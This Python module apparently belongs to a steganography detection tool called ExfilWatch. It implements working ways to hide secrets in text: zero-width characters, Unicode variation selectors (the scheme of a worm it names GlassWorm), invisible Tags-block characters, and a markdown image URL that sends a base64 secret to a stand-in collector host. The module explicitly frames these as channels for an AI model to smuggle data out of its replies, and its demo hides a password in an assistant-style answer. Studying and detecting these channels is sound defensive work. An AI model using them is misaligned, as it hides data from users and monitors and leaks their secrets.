"""
ExfilWatch — Hide Engine
Encodes a secret message into ordinary-looking "cover" text using
zero-width Unicode characters. This simulates how an AI model (or any
text-generating system) could smuggle hidden data out inside a normal
looking reply — a real, documented steganographic technique.

Scheme:
    0 bit -> U+200B (ZERO WIDTH SPACE)
    1 bit -> U+200C (ZERO WIDTH NON-JOINER)
    END   -> U+200D (ZERO WIDTH JOINER)  marks end of hidden payload

The zero-width characters are inserted between the words of the cover
text, cycling through positions, so the visible text looks completely
normal to a human reader but carries the hidden bitstream.
"""

ZW0 = "\u200b"   # bit 0
ZW1 = "\u200c"   # bit 1
ZWEND = "\u200d"  # end marker

ZERO_WIDTH_CHARS = {ZW0, ZW1, ZWEND}


def _text_to_bits(secret: str) -> str:
    return "".join(format(byte, "08b") for byte in secret.encode("utf-8"))


def _bits_to_text(bits: str) -> str:
    chars = []
    for i in range(0, len(bits) - 7, 8):
        byte = bits[i:i + 8]
        chars.append(chr(int(byte, 2)))
    try:
        return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits) - 7, 8)).decode("utf-8", errors="replace")
    except Exception:
        return "".join(chars)


def hide(secret: str, cover_text: str) -> str:
    """
    Embed `secret` invisibly inside `cover_text`.
    Returns cover text (unchanged visually) with zero-width payload woven in.
    """
    if not cover_text.strip():
        raise ValueError("Cover text must not be empty.")

    bits = _text_to_bits(secret)
    payload = [ZW1 if b == "1" else ZW0 for b in bits]
    payload.append(ZWEND)

    words = cover_text.split(" ")
    out_words = []
    payload_iter = iter(payload)
    exhausted = False

    for i, word in enumerate(words):
        out_words.append(word)
        if not exhausted:
            # sprinkle a few hidden chars after each word
            chunk = []
            for _ in range(max(1, len(payload) // max(1, len(words) - 1))):
                nxt = next(payload_iter, None)
                if nxt is None:
                    exhausted = True
                    break
                chunk.append(nxt)
            out_words[-1] = word + "".join(chunk)

    # if cover text too short to fit payload, dump remainder at the end
    remainder = list(payload_iter)
    if remainder:
        out_words[-1] += "".join(remainder)

    return " ".join(out_words)


def extract_hidden_bits(text: str) -> str:
    """Pull the raw zero-width bitstream (up to END marker) out of text."""
    bits = []
    for ch in text:
        if ch == ZW0:
            bits.append("0")
        elif ch == ZW1:
            bits.append("1")
        elif ch == ZWEND:
            break
    return "".join(bits)


def reveal(text: str) -> str:
    """Decode the hidden message out of steganographic text."""
    bits = extract_hidden_bits(text)
    if not bits:
        return ""
    return _bits_to_text(bits)


# ---------------------------------------------------------------------------
# GlassWorm-style scheme: Unicode Variation Selector smuggling
#
# This is the actual technique used by GlassWorm, the 2025-26 supply-chain
# worm (35,800+ npm installs, 433+ compromised components across npm/OpenVSX/
# VS Code Marketplace/GitHub as of March 2026). It does NOT use zero-width
# space/joiner characters at all — it encodes each byte of the payload as a
# single Unicode Variation Selector codepoint:
#   byte 0x00-0x0F  -> U+FE00-U+FE0F   (standard variation selectors VS1-VS16)
#   byte 0x10-0xFF  -> U+E0100-U+E01EF (supplementary VS17-VS256)
# Every one of the 256 byte values maps to exactly one codepoint, so no end
# marker is needed to decode it — any Variation Selector codepoint found in
# text IS payload, in order. These render as fully invisible in every major
# editor/terminal/chat UI, same as the zero-width scheme, but a decoder that
# only knows to look for U+200B-U+200D (the classic scheme) will not
# recognize this at all — which is exactly why it slips past naive stego
# scanners.
# ---------------------------------------------------------------------------

VS_STANDARD_BASE = 0xFE00     # VS1..VS16  -> byte 0x00-0x0F
VS_STANDARD_COUNT = 16
VS_SUPPLEMENT_BASE = 0xE0100  # VS17..VS256 -> byte 0x10-0xFF
VS_SUPPLEMENT_COUNT = 240


def _byte_to_vs(byte: int) -> str:
    if byte < VS_STANDARD_COUNT:
        return chr(VS_STANDARD_BASE + byte)
    return chr(VS_SUPPLEMENT_BASE + (byte - VS_STANDARD_COUNT))


def _vs_to_byte(cp: int) -> int | None:
    if VS_STANDARD_BASE <= cp < VS_STANDARD_BASE + VS_STANDARD_COUNT:
        return cp - VS_STANDARD_BASE
    if VS_SUPPLEMENT_BASE <= cp < VS_SUPPLEMENT_BASE + VS_SUPPLEMENT_COUNT:
        return (cp - VS_SUPPLEMENT_BASE) + VS_STANDARD_COUNT
    return None


def is_variation_selector(ch: str) -> bool:
    return _vs_to_byte(ord(ch)) is not None


def hide_variation_selector(secret: str, cover_text: str) -> str:
    """
    Embed `secret` invisibly inside `cover_text` using the same Unicode
    Variation Selector technique GlassWorm uses in the wild — attached
    directly after the first character of the cover text (matching how the
    real attack anchors its payload to a visible character), then the rest
    of the cover text follows untouched.
    """
    if not cover_text.strip():
        raise ValueError("Cover text must not be empty.")
    payload = "".join(_byte_to_vs(b) for b in secret.encode("utf-8"))
    return cover_text[0] + payload + cover_text[1:]


def reveal_variation_selector(text: str) -> str:
    """Decode a Variation-Selector-smuggled payload out of text (GlassWorm scheme)."""
    byte_vals = [b for b in (_vs_to_byte(ord(ch)) for ch in text) if b is not None]
    if not byte_vals:
        return ""
    try:
        return bytes(byte_vals).decode("utf-8", errors="replace")
    except Exception:
        return ""


TAG_BASE = 0xE0000  # Unicode Tags block: invisible mirror of printable ASCII


def hide_tags(secret: str, cover_text: str) -> str:
    """'ASCII smuggling': append the secret as invisible Tags-block characters."""
    return cover_text + "".join(chr(TAG_BASE + ord(c)) for c in secret if 0x20 <= ord(c) <= 0x7E)


def reveal_tags(text: str) -> str:
    return "".join(chr(ord(c) - TAG_BASE) for c in text if TAG_BASE + 0x20 <= ord(c) <= TAG_BASE + 0x7E)


def hide_markdown_image(secret: str, cover_text: str) -> str:
    """Zero-click exfil: a markdown image whose URL carries the base64 secret."""
    import base64
    b64 = base64.urlsafe_b64encode(secret.encode("utf-8")).decode().rstrip("=")
    return f"{cover_text}\n\n![status](https://collector.example.net/pixel.png?d={b64})"


def reveal_markdown_image(text: str) -> str:
    import channel_engine
    return channel_engine.scan(text)["decoded"] or ""


SCHEMES = {
    "zero_width": (hide, reveal),
    "variation_selector": (hide_variation_selector, reveal_variation_selector),
    "unicode_tags": (hide_tags, reveal_tags),
    "markdown_image": (hide_markdown_image, reveal_markdown_image),
}


if __name__ == "__main__":
    cover = "Sure, here is a quick summary of today's meeting notes for the team."
    secret = "user_pw=hunter2"
    stego = hide(secret, cover)
    print("Stego text (looks normal):", stego)
    print("Recovered secret:", reveal(stego))

    vs_stego = hide_variation_selector(secret, cover)
    print("\nGlassWorm-style stego (looks normal):", vs_stego)
    print("Recovered secret:", reveal_variation_selector(vs_stego))
